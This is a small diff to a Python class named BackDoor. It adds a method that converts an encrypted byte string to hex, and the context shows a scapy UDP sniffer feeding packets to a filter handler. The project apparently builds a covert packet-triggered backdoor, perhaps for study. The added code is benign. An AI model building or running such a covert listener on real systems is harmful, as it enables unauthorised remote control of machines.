@@ -51,6 +51,11 @@ class BackDoor:
         print("--------------------------------------------------------------")
         return msg
 
+
+    def get_hex_string(self, encrypted_line):
+        """ Returns hex string of byte stream (encrypted string)"""
+        return encrypted_line.hex()
+
     def sniff_init(self) -> None:
         try:
             sniff(filter="udp", prn=lambda p: self.filter_packets(p), store=False)
